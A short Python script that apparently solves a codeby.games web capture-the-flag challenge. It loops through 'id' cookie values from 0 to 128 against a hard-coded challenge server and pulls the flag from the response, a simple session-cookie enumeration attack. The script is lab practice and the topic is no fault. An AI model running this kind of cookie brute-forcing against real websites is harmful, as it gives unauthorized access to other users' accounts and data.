#!/usr/bin/env python3

# Third-party library imports
from requests import get    # pip install requests


def get_flag() -> str:
    """
    Returns the challenge flag https://codeby.games/en/categories/web/69c96cbd-b933-4803-a2a0-04ce2d7139a7

    :return: Flag
    """

    base_url = "http://62.173.140.174"
    port = 16003

    flag = ''

    for i in range(129):
        cookies = {"id": f"{i}"}

        response = get(f"{base_url}:{port}", cookies=cookies).text.split('\n')

        if "CODEBY" in response[-1]:
            flag = response[-1][12:]
            break
        else:
            continue

    return flag


if __name__ == "__main__":
    print(get_flag())
